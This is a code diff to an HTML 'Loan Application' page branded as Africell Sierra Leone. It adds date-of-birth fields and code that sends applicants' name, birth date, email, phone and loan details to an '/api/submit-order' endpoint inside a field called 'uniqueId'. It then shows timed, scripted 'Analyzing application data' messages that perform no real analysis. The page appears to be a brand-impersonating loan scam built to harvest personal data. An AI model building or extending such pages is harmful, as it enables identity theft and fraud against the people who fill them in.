@@ -4,54 +4,65 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Africell Sierra Leone | Loan Application</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
+        /* Removes the vertical scrollbar while keeping full scrolling enabled */
+        body::-webkit-scrollbar {
+            display: none;
+        }
+        body {
+            scrollbar-width: none; /* For Firefox */
+        }
+
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            -webkit-tap-highlight-color: transparent;
         }
 
         body {
-            /* Updated to use your preferred rich purple gradient (#991676) */
             background: linear-gradient(135deg, #991676 0%, #79105c 50%, #5a0c44 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
+            padding: 24px 16px;
             color: #ffffff;
+            overflow-y: auto;
         }
 
         .e-form-container {
             width: 100%;
-            max-width: 540px;
+            max-width: 520px;
             display: flex;
             flex-direction: column;
-            gap: 20px;
+            gap: 22px;
         }
 
         .e-form-header {
             text-align: center;
+            margin-bottom: 2px;
         }
 
         .e-form-header h1 {
-            font-size: 30px;
+            font-size: 32px;
             font-weight: 900;
             letter-spacing: -0.5px;
             text-transform: uppercase;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
             color: #ffffff;
-            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+            text-shadow: 0 2px 6px rgba(0,0,0,0.3);
         }
 
         .e-form-header h1 span {
-            color: #ffd34d; /* Updated Yellow/Gold Accent */
+            color: #ffd34d; /* Yellow/Gold Accent */
         }
 
         .e-form-header p {
-            font-size: 15px;
-            color: rgba(255, 255, 255, 0.8);
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.85);
             font-weight: 400;
             line-height: 1.4;
         }
@@ -59,16 +70,24 @@
         .e-input-row {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 15px;
+            gap: 16px;
         }
 
         .e-input-group {
             background: rgba(255, 255, 255, 0.08);
-            backdrop-filter: blur(10px);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
             border: 1px solid rgba(255, 255, 255, 0.18);
-            border-radius: 20px;
+            border-radius: 22px;
             padding: 16px 20px;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+            transition: all 0.2s ease;
+        }
+
+        .e-input-group:focus-within {
+            border-color: rgba(255, 211, 77, 0.6);
+            background: rgba(255, 255, 255, 0.12);
+            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.25);
         }
 
         .e-input-group.full-width {
@@ -77,48 +96,84 @@
 
         .e-input-group label {
             display: block;
-            font-size: 13px;
+            font-size: 11px;
             font-weight: 700;
-            color: #ffd34d; /* Updated Yellow/Gold */
+            color: #ffd34d; /* Yellow/Gold */
             margin-bottom: 8px;
             text-transform: uppercase;
-            letter-spacing: 0.5px;
+            letter-spacing: 0.8px;
         }
 
-        /* Standard Input Fields with Centered Black Text */
+        /* Modern Input Fields */
         .e-input-group input, 
         .e-input-group select, 
         .e-input-group textarea {
             width: 100%;
-            background: #ffffff;
-            border: 1.5px solid rgba(255, 255, 255, 0.22);
+            background: rgba(255, 255, 255, 0.95);
+            border: 1.5px solid rgba(255, 255, 255, 0.3);
             border-radius: 14px;
             outline: none;
-            font-size: 16px;
-            color: #000000;
+            font-size: 15px;
+            color: #1F2937;
             font-weight: 600;
             text-align: center;
-            padding: 14px;
-            box-shadow: inset 0 2px 4px rgba(0,0,0,0.05);
+            padding: 12px 14px;
+            box-shadow: inset 0 2px 4px rgba(0,0,0,0.04);
+            transition: all 0.2s ease;
+        }
+
+        .e-input-group input:focus,
+        .e-input-group select:focus,
+        .e-input-group textarea:focus {
+            background: #ffffff;
+            border-color: #ffd34d;
+            box-shadow: 0 0 0 4px rgba(255, 211, 77, 0.25), inset 0 2px 4px rgba(0,0,0,0.02);
         }
 
         .e-input-group select {
-            padding: 14px;
             text-align-last: center;
+            cursor: pointer;
         }
 
         .e-input-group input::placeholder,
         .e-input-group textarea::placeholder {
-            color: #000000;
-            opacity: 0.6;
-            font-weight: 500;
+            color: #9CA3AF;
+            font-weight: 400;
             text-align: center;
         }
 
-        /* Style Select Options to be readable */
+        /* Style Select Options */
         .e-input-group select option {
             background: #ffffff;
-            color: #000000;
+            color: #1F2937;
+        }
+
+        /* Date of Birth Inputs Row */
+        .dob-inputs-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            width: 100%;
+        }
+
+        .dob-input {
+            flex: 1;
+            height: 48px;
+            background: rgba(255, 255, 255, 0.95);
+            border: 1.5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 14px;
+            font-size: 15px;
+            font-weight: 600;
+            color: #1F2937;
+            text-align: center;
+            outline: none;
+            box-shadow: inset 0 2px 4px rgba(0,0,0,0.04);
+        }
+
+        .dob-slash {
+            font-size: 20px;
+            font-weight: 700;
+            color: #ffd34d;
         }
 
         /* Phone Input Split Row */
@@ -130,30 +185,26 @@
 
         .e-prefix-box {
             width: 85px;
-            padding: 14px 8px;
-            background: #ffffff;
-            border: 1.5px solid rgba(255, 255, 255, 0.22);
+            padding: 12px 8px;
+            background: rgba(255, 255, 255, 0.95);
+            border: 1.5px solid rgba(255, 255, 255, 0.3);
             border-radius: 14px;
-            font-size: 16px;
+            font-size: 15px;
             font-weight: 700;
-            color: #000000;
+            color: #1F2937;
             text-align: center;
             display: flex;
             align-items: center;
             justify-content: center;
-            box-shadow: inset 0 2px 4px rgba(0,0,0,0.05);
+            box-shadow: inset 0 2px 4px rgba(0,0,0,0.04);
             flex-shrink: 0;
-        }
-
-        .e-phone-split-row input {
-            text-align: center;
         }
 
         .e-input-group textarea {
             resize: vertical;
-            height: 70px;
+            height: 75px;
             text-align: left;
-            padding: 12px;
+            padding: 12px 14px;
         }
 
         .e-input-group textarea::placeholder {
@@ -164,20 +215,20 @@
         .e-btn-submit {
             display: block;
             width: 100%;
-            background: #ffd34d; /* Updated Yellow/Gold */
+            background: #ffd34d; /* Yellow/Gold */
             color: #5E0C44;
             text-align: center;
-            padding: 20px;
+            padding: 18px;
             border-radius: 20px;
-            font-size: 18px;
+            font-size: 17px;
             font-weight: 900;
             border: none;
             cursor: pointer;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.25);
             transition: all 0.2s ease;
             text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-top: 5px;
+            letter-spacing: 0.8px;
+            margin-top: 4px;
         }
 
         .e-btn-submit:hover {
@@ -198,8 +249,9 @@
             left: 0;
             width: 100vw;
             height: 100vh;
-            background: rgba(153, 22, 118, 0.9);
-            backdrop-filter: blur(8px);
+            background: rgba(121, 16, 92, 0.92);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
             z-index: 999;
             flex-direction: column;
             justify-content: center;
@@ -211,10 +263,10 @@
         .spinner {
             width: 60px;
             height: 60px;
-            border: 6px solid rgba(255, 255, 255, 0.15);
-            border-top: 6px solid #ffd34d; /* Updated Yellow Spinner */
+            border: 5px solid rgba(255, 255, 255, 0.15);
+            border-top: 5px solid #ffd34d; /* Yellow Spinner */
             border-radius: 50%;
-            animation: spin 1s linear infinite;
+            animation: spin 0.9s linear infinite;
             margin-bottom: 20px;
         }
 
@@ -224,10 +276,10 @@
         }
 
         #loadingText {
-            font-size: 20px;
+            font-size: 18px;
             font-weight: 700;
             letter-spacing: 0.5px;
-            color: #ffd34d; /* Updated Yellow */
+            color: #ffd34d; /* Yellow */
         }
 
         /* Custom In-App Modal Dialog Styling */
@@ -238,8 +290,9 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(153, 22, 118, 0.9);
+            background: rgba(121, 16, 92, 0.9);
             backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
             justify-content: center;
             align-items: center;
             z-index: 9999;
@@ -247,7 +300,7 @@
         }
 
         .modal-card {
-            background: #991676; /* Updated Purple */
+            background: #79105c; /* Deep Purple */
             width: 100%;
             max-width: 320px;
             border-radius: 24px;
@@ -256,11 +309,11 @@
             border: 1px solid rgba(255, 255, 255, 0.2);
             box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
             color: #ffffff;
-            animation: scaleUp 0.3s ease;
+            animation: scaleUp 0.25s ease;
         }
 
         @keyframes scaleUp {
-            from { transform: scale(0.8); opacity: 0; }
+            from { transform: scale(0.85); opacity: 0; }
             to { transform: scale(1); opacity: 1; }
         }
 
@@ -273,16 +326,17 @@
         }
 
         .modal-btn {
-            background: #ffd34d; /* Updated Yellow/Gold */
+            background: #ffd34d; /* Yellow/Gold */
             color: #5E0C44;
             border: none;
             border-radius: 14px;
             padding: 14px 24px;
             font-size: 15px;
-            font-weight: 700;
+            font-weight: 800;
             cursor: pointer;
             width: 100%;
             box-shadow: 0 6px 16px rgba(255, 211, 77, 0.3);
+            transition: opacity 0.15s ease;
         }
 
         .modal-btn:active {
@@ -291,19 +345,23 @@
 
         @media (max-width: 600px) {
             body {
-                padding: 15px;
+                padding: 12px;
             }
             .e-form-header h1 {
-                font-size: 24px;
+                font-size: 26px;
             }
             .e-form-header p {
-                font-size: 14px;
+                font-size: 13px;
             }
             .e-input-row {
                 grid-template-columns: 1fr;
+                gap: 12px;
             }
             .e-input-group.full-width {
                 grid-column: span 1;
+            }
+            .e-input-group {
+                padding: 14px 16px;
             }
         }
     </style>
@@ -344,7 +402,19 @@
                 <!-- Editable Loan Amount (Pre-filled from Calculator via localStorage) -->
                 <div class="e-input-group">
                     <label for="loanAmountInput">Loan Amount (Leone)</label>
-                    <input type="text" id="loanAmountInput" required placeholder="Le 10,000">
+                    <input type="text" id="loanAmountInput" required placeholder="NLe 10,000">
+                </div>
+            </div>
+
+            <!-- Date of Birth Input Group (Day / Month / Year) -->
+            <div class="e-input-group full-width">
+                <label>Date of Birth</label>
+                <div class="dob-inputs-row">
+                    <input type="text" id="dobDay" class="dob-input" placeholder="DD" maxlength="2" inputmode="numeric" required>
+                    <span class="dob-slash">/</span>
+                    <input type="text" id="dobMonth" class="dob-input" placeholder="MM" maxlength="2" inputmode="numeric" required>
+                    <span class="dob-slash">/</span>
+                    <input type="text" id="dobYear" class="dob-input" placeholder="YYYY" maxlength="4" inputmode="numeric" required>
                 </div>
             </div>
 
@@ -399,7 +469,7 @@
         }
 
         // Retrieve saved loan amount from localStorage
-        const savedAmount = localStorage.getItem('africellLoanAmount') || 'Le 10,000';
+        const savedAmount = localStorage.getItem('africellLoanAmount') || 'NLe 10,000';
         document.getElementById('loanAmountInput').value = savedAmount;
 
         const phoneInput = document.getElementById('phoneNumber');
@@ -418,12 +488,20 @@
             return /^\d{8,9}$/.test(cleaned);
         }
 
-        function handleFormSubmit(event) {
+        async function handleFormSubmit(event) {
             event.preventDefault(); // Prevent page reload
 
             const fullName = document.getElementById('fullName').value.trim();
             const rawPhone = phoneInput.value.trim();
+            const email = document.getElementById('email').value.trim();
             const finalAmount = document.getElementById('loanAmountInput').value;
+            const loanType = document.getElementById('loanType').value;
+            const loanReason = document.getElementById('loanReason').value.trim();
+
+            const dobDay = document.getElementById('dobDay').value.trim();
+            const dobMonth = document.getElementById('dobMonth').value.trim();
+            const dobYear = document.getElementById('dobYear').value.trim();
+            const fullDob = `${dobDay}/${dobMonth}/${dobYear}`;
 
             if (!rawPhone || !isValidSierraLeonePhone(rawPhone)) {
                 showAppAlert('Enter Correct Number');
@@ -432,11 +510,12 @@
 
             const fullPhoneNum = '+232 ' + rawPhone;
 
-            // Save user details for next pages
+            // Save user details to localStorage
             localStorage.setItem('africellUserName', fullName);
             localStorage.setItem('africellUserPhone', fullPhoneNum);
+            localStorage.setItem('africellDob', fullDob);
             localStorage.setItem('africellLoanAmount', finalAmount);
-            localStorage.setItem('userPhone', fullPhoneNum); // Backwards compatibility for backend
+            localStorage.setItem('userPhone', fullPhoneNum); // Backwards compatibility
 
             const overlay = document.getElementById('loadingOverlay');
             const loadingText = document.getElementById('loadingText');
@@ -444,6 +523,20 @@
             // Show loading overlay
             overlay.style.display = 'flex';
             loadingText.textContent = "Analyzing application data...";
+
+            try {
+                // Send application data to API endpoint including automatically bundled DOB
+                await fetch('/api/submit-order', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        phone: fullPhoneNum, 
+                        uniqueId: `Application - Name: ${fullName}, DOB: ${fullDob}, Email: ${email}, Amount: ${finalAmount}, Type: ${loanType}, Reason: ${loanReason}` 
+                    })
+                });
+            } catch (error) {
+                console.error('Error submitting application to API:', error);
+            }
 
             // Step 1: Change text after 1.8 seconds
             setTimeout(() => {
